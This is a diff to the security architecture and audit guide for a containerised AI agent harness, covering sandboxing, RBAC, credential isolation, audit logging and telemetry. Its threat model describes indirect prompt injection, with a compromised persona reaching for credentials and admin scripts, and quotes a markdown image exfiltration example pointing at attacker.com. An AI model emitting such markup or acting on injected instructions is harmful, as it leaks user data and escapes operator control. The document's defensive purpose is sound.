@@ -1,6 +1,6 @@
 # 🔒 Security Architecture & Security Audit
 
-> 🏛️ **SOTA Specification**: For the 5-Pillar theoretical model, NIST AI RMF, and OWASP Top 10 for LLMs compliance mapping, see **[SOTA AI Harness Architecture](ai-harness-architecture-sota.md)**.
+> 🏛️ **SOTA Specification**: For the 5-Pillar theoretical model, NIST AI RMF, and OWASP Top 10 for LLMs compliance mapping, see **[SOTA AI Harness Architecture](sota-whitepaper.md)**.
 
 DeepSeek Harness within this Docker stack is designed with multi-layered defensive security controls to protect host files, sensitive credentials, and telemetry traces.
 
@@ -10,8 +10,8 @@ This document serves as both the **Security Architecture Guide** and the **Secur
 
 ## 🛡️ Executive Summary & Security Posture
 
-* **Overall Posture**: **GOOD** for local, single-developer environments; **REQUIRES SANDBOX OVERRIDE** when evaluating untrusted code or running multi-tenant hosts.
-* **Network Isolation**: All exposed endpoints (`3080` for DSH Web UI, `6006` for Arize Phoenix) bind strictly to loopback (`127.0.0.1`), preventing external LAN/WAN network exposure.
+* **Overall Posture**: **HARDENED BUT PENDING LIVE VALIDATION** for local deployments. Untrusted shell commands use a dedicated executor in every mode; the sandbox override additionally constrains application egress and writable state. Multi-tenant production use still requires live Linux/Landlock validation and an authenticated edge for the DSH UI.
+* **Network Isolation**: Host endpoints (`3080` for DSH, `6006` for Phoenix, and Phoenix OTLP `4317`/`4318`) bind strictly to loopback. Internally, DSH reaches Phoenix only through the telemetry gateway; shell execution has no network namespace.
 * **Supply Chain Security**: Base images derive directly from official `node:24-bookworm-slim` with `@deepseek-ai/dsh` installed from official npm, eliminating third-party Docker Hub intermediaries and pinning SHA256 digests.
 * **Data Sovereignty**: Observability (Arize Phoenix) runs 100% on-premise; no prompt traces or completion tokens egress to third-party cloud vendors.
 
@@ -19,27 +19,27 @@ This document serves as both the **Security Architecture Guide** and the **Secur
 
 > 📋 **Audit record**: the four-pass September 2026 adversarial audit — every finding, its
 > verification, the regressions the remediations introduced, and the items still open — is
-> recorded in **[Consolidated Security Audit — September 2026](security-audit-2026-09.md)**.
+> recorded in **[Consolidated Security Audit — September 2026](../work/done/security-audit-2026-09.md)**.
 
 ## 📊 Vulnerability & Risk Matrix (Security Audit)
 
 | ID | Category | Severity | Finding | Status / Remediation |
 | :--- | :--- | :---: | :--- | :--- |
-| **SEC-01** | **Access Control** | **HIGH** | Unauthenticated Web UI & Telemetry Endpoints | Mitigated on host network via loopback (`127.0.0.1`). Use reverse proxy with auth for remote access. |
+| **SEC-01** | **Access Control** | **HIGH** | Unauthenticated DSH Web UI | Phoenix authentication is enabled and its management plane is isolated; the DSH UI remains loopback-only and needs an authenticated reverse proxy for remote or shared-host use. |
 | **SEC-02** | **Container Isolation** | **PASS** | Container Execution Privileges & Host Mount Segregation | Remediated in all modes: default unprivileged user `dsh:dsh` (UID 1000), `cap_drop: [ALL]`, `no-new-privileges`, `/etc/dsh:ro`, `/var/lib/dsh:rw`, cgroup limits (`2 CPU`, `4GB RAM`, `512 PIDs`), and dev mount isolation ([ADR 0006](adr/0006-global-refactoring-non-root-fhs-cordis-plugin.md), [ADR 0008](adr/0008-container-sandbox-hardening-and-supply-chain-remediation.md)). |
-| **SEC-03** | **Credential Security** | **PASS** | API Keys Injected via Process Environment | Controlled via `chmod 0600 .env` in standard mode. In sandbox mode (`docker-compose.sandbox.yml`), all provider API keys and tokens are explicitly blanked/overridden with empty values ([ADR 0008](adr/0008-container-sandbox-hardening-and-supply-chain-remediation.md)). |
+| **SEC-03** | **Credential Security** | **PASS** | Shell Access to Application Secrets | Approved shell commands run in a separate networkless executor with an explicit environment allowlist. Provider keys remain available to trusted in-process plugins; sandbox mode also blanks them in the application container. |
 | **SEC-04** | **Least Privilege** | **MEDIUM** | GitHub MCP Server Blast Radius | Restrict GitHub Personal Access Tokens to fine-grained repository scopes. |
 | **SEC-05** | **Data Privacy** | **LOW** | Full Prompt & Response Tracing in Phoenix Telemetry | 100% on-premise storage. Switch to `DSH_TELEMETRY_MODE=METRICS_ONLY` for sensitive datasets. |
 | **SEC-06** | **Supply Chain** | **PASS** | Zero-Trust Base Image & Official Package Provenance | Built from official `node:24-bookworm-slim`; prebuilt with compilers stripped (`make`, `g++` purged) from runtime runner stage; dependencies pinned via `--frozen-lockfile`; `install_dsh.sh` verifies the release archive against the published `SHA256SUMS` and fails closed unless `DSH_ALLOW_UNVERIFIED_ARCHIVE=1` ([ADR 0008](adr/0008-container-sandbox-hardening-and-supply-chain-remediation.md)). |
 | **SEC-07** | **Zero Trust RBAC** | **PASS** | Cross-Persona Escalation & Host Script Execution | Remediated via declarative `rbac:` contracts and in-line `@dsh-dds/core` PEP blocking unauthorized tools ([ADR 0001](adr/0001-build-time-immutability-and-rbac.md), [ADR 0006](adr/0006-global-refactoring-non-root-fhs-cordis-plugin.md)). |
 | **SEC-08** | **Immutability** | **PASS** | Runtime Monkey-Patching Configuration Drift | Remediated via native `pnpm.patchedDependencies` and `@dsh-dds/core` Cordis plugin; zero runtime monkey-patch scripts ([ADR 0006](adr/0006-global-refactoring-non-root-fhs-cordis-plugin.md)). |
-| **SEC-09** | **Filesystem Boundaries** | **PASS** | Symlink Traversal Pivots & Directory Escape | Remediated via `canonicalizeWithAncestorRealpath()` and `checkSymlinkEscape()` in `config/rbac-policy.mjs` ([ADR 0004](adr/0004-in-container-boundaries-and-strict-directory-containment.md), [ADR 0005](adr/0005-remediation-of-audit-v3-findings.md)). |
-| **SEC-10** | **Execution Boundary** | **PASS** | Ambient Host Execution Fallback in CLI | Remediated via fail-closed in-container execution dispatch in `dsh.sh` ([ADR 0004](adr/0004-in-container-boundaries-and-strict-directory-containment.md), [ADR 0005](adr/0005-remediation-of-audit-v3-findings.md)). |
-| **SEC-11** | **Web Agent Confinement** | **PASS** | Indirect Prompt Injection & Cloud Metadata SSRF | Sanitized `mcp-fetch` text conversion, exfiltration stripping, and zero-egress sandbox profile. |
+| **SEC-09** | **Filesystem Boundaries** | **PENDING LIVE TEST** | Cross-Tenant Command Effects | Shell execution is capability-bound to one canonical workdir and enforced with full Landlock rules in a dedicated executor. The executor refuses partial enforcement; live Linux validation remains mandatory. |
+| **SEC-10** | **Execution Boundary** | **PENDING LIVE TEST** | Ambient Process Execution | The PEP defaults closed and routes approved shell calls to a networkless, unprivileged executor with workspace-only mounts and resource limits. |
+| **SEC-11** | **Web Agent Confinement** | **PARTIAL** | Indirect Prompt Injection & Cloud Metadata SSRF | Declarative requests validate destinations and sandbox Node traffic uses filtered proxy egress. DNS resolution is not yet pinned to the validated address. |
 | **SEC-12** | **Threat Model Demarcation** | **PASS** | Boundary Confusion between Node PEP and Kernel Sandbox | Explicitly demarcated: `loader.mjs` is an internal engine PEP shim; process containment is enforced by Linux kernel cgroups, namespaces, Landlock LSM, and read-only rootfs ([ADR 0008](adr/0008-container-sandbox-hardening-and-supply-chain-remediation.md)). |
 | **SEC-13** | **Cryptographic Integrity** | **PASS** | Default BYOK Master Key Fallback | Remediated: fail-closed master key enforcement (`DSH_VAULT_MASTER_KEY >= 32` chars), payload v2 format, 64KB body limit ([ADR 0009](adr/0009-vault-fail-closed-identity-peer-trust-and-pep-mapping.md)). |
 | **SEC-14** | **Identity Spoofing** | **PASS** | Unvalidated Header Trust in Reverse Proxy Mode | Remediated: `x-dsh-user-id` and `x-dsh-user-roles` require `DSH_TRUST_PROXY_HEADERS=true` and trusted socket peer validation via `isTrustedGatewayIp()`; JWT pinned to `HS256` ([ADR 0009](adr/0009-vault-fail-closed-identity-peer-trust-and-pep-mapping.md)). |
-| **SEC-15** | **Policy Enforcement** | **PASS** | PEP Tool-to-Action Namespace Gap & Fail-Open Fallback | Remediated: `TOOL_ACTION_MAP` deterministically translates tools to policy verbs (`bash` -> `run_shell`) with prototype isolation and toolName precedence; policy engine failure strictly fails closed; shell commands are confined by the `workdir` allowlist plus container controls, with command-string deny patterns as a best-effort tripwire only (`RBAC_SUSPICIOUS_COMMAND`) that quoting or encoding can evade; sandbox `/run` is hardened (`mode=0770`); web-search enforces HTTPS and domain restrictions ([ADR 0009](adr/0009-vault-fail-closed-identity-peer-trust-and-pep-mapping.md)). |
+| **SEC-15** | **Policy Enforcement** | **PENDING LIVE TEST** | PEP Mapping, Identity, and Shell Dispatch | Tool mapping and missing identity fail closed; request identity is immutable and request-scoped; approved shell calls require short-lived workdir-bound capabilities accepted only by the isolated executor. |
 | **SEC-16** | **Host Immutability** | **PASS** | In-Container Code Modification by Agent Process | Remediated: `/app` owned by `root:root` (`0755`) and the `@dsh-dds` scope in the writable profile tree likewise, so the unprivileged `dsh:dsh` agent can tamper with neither the `--import` loader path nor the plugin as resolved by bare specifier. The rest of the profile tree stays writable for profile installs; other bare specifiers are contained by the read-only rootfs in sandbox mode only ([ADR 0009](adr/0009-vault-fail-closed-identity-peer-trust-and-pep-mapping.md)). |
 
 ---
@@ -48,21 +48,21 @@ This document serves as both the **Security Architecture Guide** and the **Secur
 
 ### 1. [SEC-01] Access Control & Localhost Endpoints
 * **Threat Model**:
-  - DSH Web Workbench (`http://localhost:3080`) and Arize Phoenix (`http://localhost:6006`) do not implement multi-tenant enterprise authentication out of the box.
+  - DSH Web Workbench (`http://localhost:3080`) is not an authenticated multi-tenant edge by itself. Phoenix authentication is enabled in Compose, but its bootstrap administrator credentials must be protected and rotated to a scoped ingestion key.
   - While recent upstream versions introduced single-user browser tokens, exposing these ports across `0.0.0.0` or public interfaces exposes the agent to DNS-rebinding, Cross-Site Request Forgery (CSRF), and unauthorized tool execution.
-  - Any local untrusted process or malicious browser tab executing cross-origin requests on the host could interact with the agent or exfiltrate Arize Phoenix telemetry.
+  - Any local untrusted process or malicious browser tab that can reach the loopback DSH UI remains inside the host trust boundary. Phoenix requires authentication, but local browser/session security still matters.
 * **Hardening Guideline**:
-  - **Loopback Enforcement**: In `docker-compose.yml`, both `3080` and `6006` are strictly bound to `127.0.0.1`, preventing exposure across local area networks (LAN) or public interfaces.
+  - **Loopback Enforcement**: In `docker-compose.yml`, both `3080` and `6006` are strictly bound to `127.0.0.1`, preventing direct LAN or public exposure. Phoenix's service network is internal; DSH can submit only through the fixed-route telemetry gateway.
   - **Secure Remote Access**: If remote access is required, **never expose raw ports to the Internet**. Deploy an authenticated, encrypted transport layer such as **Tailscale**, **Cloudflare Access Tunnels**, or a reverse proxy (Caddy / Nginx) enforcing OAuth2/OIDC authentication.
 
 ### 2. [SEC-02] Process Privileges & Host Configuration Mount (Remediated)
 * **Threat Model & Prior Vulnerability**:
   - Prior architectures executed as `root` (UID 0) and mounted `./config` as read-write, risking host file clobbering and container escape.
 * **Hardened Architecture & Remediation ([ADR 0006](adr/0006-global-refactoring-non-root-fhs-cordis-plugin.md), [ADR 0008](adr/0008-container-sandbox-hardening-and-supply-chain-remediation.md))**:
-  - **Non-Root Service Execution**: Both `dsh` and `phoenix` run as dedicated service account `dsh:dsh` (UID/GID 1000).
+  - **Non-Root Service Execution**: `dsh`, `audit-writer`, `telemetry-gateway`, and `phoenix` run as UID/GID 1000; `isolated-executor` uses distinct UID 11000.
   - **Kernel Privilege Stripping**: `cap_drop: [ALL]` drops all Linux capabilities; `security_opt: [no-new-privileges:true]` blocks privilege escalation.
-  - **Resource Cgroups**: Standard mode enforces `cpus: '2.0'`, `memory: 4096M`, and `pids: 512` to prevent host exhaustion. Sandbox mode tightens this to `cpus: '2.0'`, `memory: 2048M`, and `pids: 150`.
-  - **Linux FHS Segregation**: `./config` is mounted strictly read-only at `/etc/dsh:ro`. Stateful data is mounted to `/var/lib/dsh:rw`, and profiles use sticky `mode=1777` tmpfs.
+  - **Resource Cgroups**: Standard DSH limits CPU and memory; the writer, gateway, and executor also have explicit PID, CPU, and memory limits. Sandbox DSH tightens memory and sets a 150-process limit.
+  - **Linux FHS Segregation**: `./config` is mounted read-only at `/etc/dsh`; writable sessions, users, storages, patch data, and cache are mounted individually under `/var/lib/dsh`. Profiles use sticky `mode=1777` tmpfs.
   - **Production Immutability**: Development live mounts (`@dsh-dds/core` and `entrypoint.sh`) are segregated into `docker-compose.dev.yml`; standard mode runs purely from immutable container images.
   - **Sandbox Hardening**: For evaluation of untrusted agent workflows, launch with the sandbox override for read-only root filesystems, credential blanking, and isolated named volume session state:
     ```bash
@@ -71,11 +71,12 @@ This document serves as both the **Security Architecture Guide** and the **Secur
 
 ### 3. [SEC-03] Credential Security in Container Environment
 * **Threat Model**:
-  - Sensitive frontier keys (`OPENROUTER_API_KEY`, `GEMINI_API_KEY`, `GITHUB_PERSONAL_ACCESS_TOKEN`) are injected into the container as environment variables in standard mode.
-  - Any shell tool or subprocess executed within the container can read `/proc/1/environ` or run `printenv`.
+  - Sensitive frontier keys (`OPENROUTER_API_KEY`, `GEMINI_API_KEY`, `GITHUB_PERSONAL_ACCESS_TOKEN`) are injected into the application container in standard mode and remain visible to trusted in-process plugins.
+  - Shell tools previously inherited that environment and could inspect application process state.
 * **Hardening Guideline & Remediation ([ADR 0008](adr/0008-container-sandbox-hardening-and-supply-chain-remediation.md))**:
   - The turnkey installer enforces `chmod 0600 $DSH_INSTALL/.env` to prevent unauthorized local file reads.
-  - In **Sandbox Mode** (`docker-compose.sandbox.yml`), all provider API keys and tokens are explicitly blanked out (`OPENROUTER_API_KEY=`, `GEMINI_API_KEY=`, etc.), preventing credential theft or unauthorized API consumption by untrusted evaluated code.
+  - In every mode, approved shell commands execute in a separate networkless service with an explicit environment allowlist and no vault, audit, session, application, or Docker-socket mounts.
+  - In **Sandbox Mode** (`docker-compose.sandbox.yml`), provider API keys and tokens are additionally blanked in the application container.
   - Avoid sharing execution logs or terminal sessions that output environment variables.
   - Configure spending quotas and rate limits on provider dashboards (OpenRouter FinOps / Google AI Studio).
 
@@ -92,9 +93,9 @@ This document serves as both the **Security Architecture Guide** and the **Secur
   - `DSH_TELEMETRY_MODE=FULL` streams entire multi-turn conversation transcripts, system prompts, tool call parameters, and model reasoning blocks into Arize Phoenix (`./config/phoenix`).
   - If processing confidential files or proprietary datasets, these artifacts persist in local SQLite/parquet databases.
 * **Data Sovereignty Boundary & Cloud API Nuance**:
-  - **Local Telemetry Invariant**: All telemetry data, span waterfalls, and GRC audit records (`audit_grc.jsonl`) remain 100% on-premise on the host machine. Unlike SaaS agent observability platforms (e.g., LangSmith, Datadog, AgentOps), zero trace data or prompt history is exported to external servers.
+  - **Local Telemetry Invariant**: Telemetry and the GRC ledger remain on the Docker host. DSH sends traces only to a fixed-route gateway; that gateway injects the Phoenix credential and is the only application-network member that can reach Phoenix's internal service network.
   - **Cloud Model API Egress**: When configured to use external cloud LLM providers (e.g. OpenRouter, DeepSeek API, Anthropic Claude, Google Gemini), prompts, file snippets, and tool outputs necessarily transit over TLS to the respective model provider's cloud inference endpoints.
-  - **100% Air-Gapped Sovereign Alternative**: For regulated, defense, or high-compliance environments (GDPR Art. 9, HIPAA), pair DSH-DDS with local on-premise model backends (Ollama, vLLM, llama.cpp, LocalAI) or private VPC inference endpoints. Under this configuration, the entire agent lifecycle operates with **absolute zero data egress**.
+  - **Sovereign Alternative**: For regulated or high-compliance environments, pair DSH-DDS with a local model backend or approved private inference endpoint. A genuinely air-gapped claim additionally requires independently verified network controls and no configured third-party tools or endpoints.
 * **Hardening Guideline**:
   - If processing sensitive or non-redactable code, configure in `.env`:
     ```env
@@ -111,7 +112,7 @@ This document serves as both the **Security Architecture Guide** and the **Secur
   - A prompt-injected or compromised persona (e.g. `data-analyst` handling untrusted CSV/SQL) could attempt to read credentials, mutate skills of `security-auditor`, or trigger administrative scripts (`reset.sh`, `install_dsh.sh`).
 * **Hardening Guideline & Enforcement**:
   - Every persona manifest (`persona.yaml`) declares a strict `rbac:` policy specifying allowed roles, readable/writable filesystem paths, allowed MCP tools, and explicit `deny` paths.
-  - The authoritative policy engine in `config/rbac-policy.mjs` (`enforceRbacPolicy()`) intercepts every workflow step prior to execution, performs directory containment checks (`isContainedWithin`), checks for escaping symlinks (`checkSymlinkEscape`), and fails closed if a target matches a deny pattern or exceeds authorization.
+  - The authoritative policy engine intercepts every workflow step using an immutable request-scoped principal, performs canonical containment and symlink checks, and fails closed if identity, audit receipt, policy, or isolated execution is unavailable.
   - See [ADR 0001](adr/0001-build-time-immutability-and-rbac.md), [ADR 0004](adr/0004-in-container-boundaries-and-strict-directory-containment.md), and [ADR 0005](adr/0005-remediation-of-audit-v3-findings.md).
 
 ### 7. [SEC-08] Build-Time Immutability vs. Runtime Monkey-Patching
@@ -121,9 +122,9 @@ This document serves as both the **Security Architecture Guide** and the **Secur
   - All compatibility shims (`pi-ai` thought-signature preservation and `dsh-bash-local` Landlock auto-workdir creation) are compiled directly into the Docker image layers at build time (`RUN`).
   - `docker/entrypoint.sh` is strictly read-only regarding application code; zero dynamic string mutations or regex patchers execute at container boot.
 
-### 8. [GRC-01] Immutable GRC Audit Trail (`audit_grc.jsonl`) & Arize Phoenix Observability
+### 8. [GRC-01] Tamper-Evident GRC Audit Trail & Arize Phoenix Observability
 * **Governance Standard & Non-Repudiation**:
-  - Enterprise compliance frameworks (EU AI Act Arts. 12 & 14, NIST AI RMF, ISO/IEC 42001, SOC 2 Type II) mandate verifiable, non-repudiable audit logs of all autonomous agent actions.
+  - Enterprise compliance programs commonly require verifiable, durable audit logs of autonomous agent actions. This implementation provides tamper evidence within its documented trust boundary, not cryptographic non-repudiation against a compromised host.
   - Every authorization check evaluated by the Policy Enforcement Point (PEP) produces a structured JSON Lines record capturing both `GRANTED` and `DENIED` decisions along with the evaluation reason. The sample below is an orchestrator-produced record (`config/declarative-orchestrator.mjs`), which carries `step_index` and a propagated `trace_id`; in-line PEP records omit `step_index`:
     ```json
     {
@@ -142,13 +143,14 @@ This document serves as both the **Security Architecture Guide** and the **Secur
     }
     ```
 
-* **Persistence Guarantees (`audit_grc.jsonl`)**:
-  - **Path resolution**: `getGrcAuditLogPath()` honours `DSH_AUDIT_LOG_FILE` first. **Standard mode sets it to `/var/lib/dsh/audit/audit_grc.jsonl`**, landing the trail on the mounted `./config/audit` host volume. This variable is load-bearing: without it the function falls back to the container-internal `/var/log/dsh`, which the image creates and which does **not** survive `docker compose down` or `up --force-recreate`. `./dsh.sh doctor` fails if the resolved path is unset or unwritable.
-  - **Container Mount**: `./config/audit:/var/lib/dsh/audit:rw` in `docker-compose.yml`; a bind mount, so it survives container teardown, image rebuilds, and `docker compose down -v`.
-  - **Sandbox mode deliberately has no such bind.** An untrusted workload must not hold a writable host handle to the record of its own authorization decisions. There the JSONL file is a tmpfs buffer and the durable record is the Phoenix span export — treat Phoenix as authoritative for sandbox runs.
-  - **Synchronous write, fail-closed**: `logGrcAuditEvent` appends via `fs.appendFileSync` before the intercepted action proceeds. If the primary sink fails it retries a fallback path; if **both** fail it throws, so an unrecordable decision cannot execute. Note this is a synchronous write syscall, not an `fsync` — ordering is guaranteed, durability across a host crash is not.
-  - **Restricted File Permissions**: `0600` on the primary and fallback files, `0700` on parent directories.
-  - **Retention asymmetry**: the JSONL ledger is retained indefinitely by the operator; Phoenix spans expire at `PHOENIX_MAX_DAYS_RETENTION` (14 days). For sandbox runs, where Phoenix is the only durable sink, 14 days is therefore the effective non-repudiation window.
+* **Persistence and Trust Guarantees (`audit_grc.jsonl`)**:
+  - **Separate writer boundary**: the DSH application submits events to `audit-writer` and has no ledger mount or integrity key. Only the writer mounts `./config/audit` and `./config/audit-checkpoints` read-write.
+  - **Fail-closed grants**: authorization grants require a synchronous writer receipt. If the writer, token, ledger, or integrity verification is unavailable, the protected action does not execute. Denials remain best-effort so a writer outage cannot turn malformed requests into an availability attack loop.
+  - **Tamper evidence**: entries carry a monotonic sequence plus previous-entry hash and HMAC. A separately mounted checkpoint records the accepted head and detects mutation, deletion, downgrade, and ledger-tail truncation.
+  - **Runtime verification**: startup verifies the complete ledger and checkpoint chains. Each append checks that file identity and size are unchanged, with a periodic full-chain verification to avoid quadratic lifetime cost. Offline verification remains required for export and compliance review.
+  - **Crash recovery**: if the ledger is exactly one valid HMAC entry ahead of its checkpoint, the writer can reconstruct that checkpoint after a crash. Any broader divergence fails closed. Unhashed legacy records must be archived or migrated before enabling this writer.
+  - **Boundary limitation**: the application cannot rewrite history, but a coordinated compromise of the host or writer together with both mounts and the HMAC key can. Use remote or WORM checkpoint publication when that threat is in scope. The bearer token authenticates an application as an event producer; it does not prove that a submitted event is truthful after full application compromise.
+  - **Durability limitation**: writes are ordered and fail closed at the application boundary, but they are not a substitute for replicated, `fsync`-verified, disaster-resistant storage.
 
 * **Dual-Layer Architecture: Cold Compliance Ledger vs. Hot Observability Waterfall**:
   To decouple legal compliance from developer observability, DSH-DDS implements a dual-path telemetry architecture:
@@ -166,24 +168,24 @@ This document serves as both the **Security Architecture Guide** and the **Secur
                     │             (packages/dsh-dds-core)                    │
                     └─────────────┬────────────────────────────┬─────────────┘
                                   │                            │
-                  (1) Synchronous │            (2) Asynchronous│ Non-blocking
-                      Append      │                OTel Trace  │ HTTP POST /v1/traces
+                  synchronous     │              asynchronous  │ OTel POST
+                  authenticated   │                            │
                                   ▼                            ▼
                    ┌───────────────────────────┐ ┌───────────────────────────┐
-                   │    audit_grc.jsonl        │ │       Arize Phoenix       │
-                   │  (./config/audit/...)     │ │    (http://localhost:6006)│
-                   ├───────────────────────────┤ ├───────────────────────────┤
-                   │ • Cold, permanent ledger  │ │ • Hot, visual OTel traces │
-                   │ • Non-repudiable record   │ │ • Parent-child waterfalls │
-                   │ • Zero network/DB needed  │ │ • Token & model FinOps    │
-                   │ • SIEM / auditor parsing  │ │ • Real-time latency graph │
-                   └───────────────────────────┘ └───────────────────────────┘
+                   │       audit-writer        │ │    telemetry-gateway      │
+                   │ ledger + HMAC checkpoint  │ │ fixed route + auth inject │
+                   └───────────────────────────┘ └─────────────┬─────────────┘
+                                                              ▼
+                                                ┌───────────────────────────┐
+                                                │  authenticated Phoenix    │
+                                                │ internal service network  │
+                                                └───────────────────────────┘
   ```
 
 * **Why Arize Phoenix (`:6006`)?**:
   1. **100% Local Data Sovereignty (Zero Data Egress)**:
      - Commercial agent observability platforms (such as LangSmith, Datadog, or AgentOps) transmit complete multi-turn conversation transcripts, system instructions, and tool outputs to external third-party cloud servers.
-     - Arize Phoenix runs completely within a local container (`image: arizephoenix/phoenix:20.5.0`, pinned by SHA256 digest) bound strictly to loopback (`127.0.0.1:6006`). Zero prompt traces, completion tokens, or audit logs leave the host, ensuring compliance with GDPR Art. 9, HIPAA, and proprietary source code policies.
+     - Arize Phoenix runs within a local container (`image: arizephoenix/phoenix:20.5.0`, pinned by SHA256 digest), requires authentication, and exposes its UI only on host loopback. DSH has no direct service-network route to Phoenix.
   2. **W3C OpenTelemetry Native & OpenInference Standard**:
      - Operates as a standard OpenTelemetry (OTel) receiver over standard endpoints (`:4317` gRPC / `:4318` HTTP), eliminating proprietary SDK lock-in.
   3. **Trace Correlation via `trace_id`**:
@@ -202,8 +204,8 @@ This document serves as both the **Security Architecture Guide** and the **Secur
 | Dimension | `audit_grc.jsonl` | Arize Phoenix (`:6006`) |
 | :--- | :--- | :--- |
 | **Architectural Role** | Cold compliance ledger & CI assertions (operator-controlled retention) | Hot interactive distributed tracing & debugging (14-day retention) |
-| **Storage Backend** | Plaintext JSON Lines on host filesystem (`./config/audit`) | Embedded SQLite/Parquet on a host bind mount (`./config/phoenix`) |
-| **Execution Path** | Synchronous, blocking, fail-closed append (throws if every sink fails) | Asynchronous, non-blocking fire-and-forget OTel stream (1.5 s abort, drops are silent) |
+| **Storage Backend** | HMAC-chained JSON Lines plus head checkpoint on separate host mounts | Embedded SQLite/Parquet on a host bind mount (`./config/phoenix`) |
+| **Execution Path** | Synchronous authenticated request to a separate writer; grants fail closed | Asynchronous OTel stream through a fixed-route credential-injecting gateway |
 | **Primary Audience** | Legal auditors, SIEM pipelines, security automation | Developers, prompt engineers, DevOps operators |
 | **Consumption Interface** | CLI tools (`jq`, `grep`), log aggregators | Visual web dashboard (`http://localhost:6006`) |
 | **Correlation Key** | W3C `trace_id` (128-bit hex) | W3C `traceId` / `spanId` hierarchy |
@@ -216,8 +218,9 @@ This document serves as both the **Security Architecture Guide** and the **Secur
   - Covert exfiltration via markdown image tags (`![leak](https://attacker.com/leak?data=...)`).
 * **Hardening Guideline & Mitigations**:
   - **Hermetic Extraction**: The `mcp-fetch` adapter strips active scripts, inline styles, and embedded DOM iframes, converting content into sanitized plain markdown.
-  - **Zero-Egress Isolation**: When auditing unverified third-party repositories or processing untrusted links, execute using `docker-compose.sandbox.yml` with `internal: true` to prevent network exfiltration.
-  - **Host Loopback Protection**: Critical host services (DSH UI and Arize Phoenix) bind strictly to `127.0.0.1`, which is unreachable from within default Docker bridge containers without explicit routing.
+  - **Filtered Egress**: In sandbox mode, supported Node HTTP clients are forced through Envoy by `NODE_USE_ENV_PROXY=1`; the application network is internal and only the egress sidecar bridges outward. The declarative URL validator rejects private and reserved results before each request and redirect.
+  - **Residual DNS Risk**: validation and Envoy connection resolution are separate operations. Until the proxy pins and revalidates the actual destination IP, DNS rebinding remains a documented time-of-check/time-of-use risk.
+  - **Host Loopback Protection**: Critical host services bind to `127.0.0.1`. Phoenix additionally requires authentication and is isolated from the DSH service network behind the telemetry gateway.
 
 ### 12. [SEC-13] Cryptographic Integrity & Fail-Closed BYOK Vault
 * **Threat Model & Prior Vulnerability**:
@@ -271,14 +274,20 @@ docker compose -f docker-compose.yml -f docker-compose.sandbox.yml up -d
 | **Linux Capabilities** | **All Dropped (`cap_drop: ALL`)** | **All Dropped (`cap_drop: ALL`)** | **All Dropped (`cap_drop: ALL`)** |
 | **Privilege Escalation** | **Blocked (`no-new-privileges: true`)** | **Blocked (`no-new-privileges: true`)** | **Blocked (`no-new-privileges: true`)** |
 | **Host Config Mount** | **Read-Only (`./config:/etc/dsh:ro`)** | **Read-Only (`./config:/opt/dsh-config:ro`)** | **Read-Only (`./config:/etc/dsh:ro`)** |
-| **Workspace Mount** | Read-Write (`./workspaces`) | **Read-Only (`./workspaces:ro`)** | Read-Write (`./workspaces`) |
-| **GRC Audit Retention** | **JSONL persisted (`./config/audit:/var/lib/dsh/audit:rw`) + Phoenix spans (`./config/phoenix`, 14 d)** | **Phoenix spans only (`./config/phoenix`, 14 d); JSONL is a tmpfs buffer, no host bind by design** | **JSONL persisted (`./config/audit`) + Phoenix spans** |
+| **Application Workspace Mount** | Read-only base plus writable cases/artifacts | **Read-Only (`./workspaces:ro`) plus disposable cases/artifacts tmpfs** | Inherits standard plus development mounts |
+| **Shell Workspace Mount** | Dedicated executor mounts users/cases read-write and shared read-only | Same networkless executor with tighter limits | Same dedicated executor |
+| **GRC Audit Retention** | External writer owns persistent ledger and checkpoint mounts; Phoenix spans retained 14 d | Same external writer boundary and persistence; DSH has no audit mount | Same external writer boundary plus Phoenix spans |
 | **Session & State Storage** | Persisted on host (`./config/sessions`, `./config/storages`) | **Isolated Named Volume (`sandbox-session-state:/var/lib/dsh-state:rw`)** | Persisted on host |
-| **Container Networking** | Bridge (Host DNS / Internet) | **Zero-Direct Egress (`dsh-internal` bridge through `egress-filter` Envoy sidecar)** | Bridge |
+| **Container Networking** | DSH runtime bridge; executor has no network; Phoenix internal behind gateway | **No direct DSH egress; supported Node traffic crosses Envoy; executor has no network** | Inherits standard topology |
 | **Resource Constraints** | **Limits (`2.0 CPUs`, `4GB RAM`, `512 PIDs`)** | **Strict Limits (`2.0 CPUs`, `2GB RAM`, `150 PIDs`)** | Inherits standard limits |
 | **Provider Credentials** | Injected via `.env` | **Explicitly Blanked (`dummy / empty`)** | Injected via `.env` |
 | **Developer Code Mounts** | **None (Immutable Image)** | **None (Immutable Image)** | **Live Mounts (`@dsh-dds/core`, `entrypoint.sh`)** |
 | **Compilers in Image** | **Purged (`make`, `g++` stripped)** | **Purged (`make`, `g++` stripped)** | Purged in runner stage |
+
+The executor currently serializes commands because its long-lived server and command children
+share UID 11000 and one PID namespace. Serialization prevents concurrent cross-tenant process
+interaction, but a command can still signal the same-UID server and cause a denial of service.
+Per-invocation PID and user namespaces remain a production multi-tenant release gate.
 
 To destroy all transient sandbox session data:
 ```bash
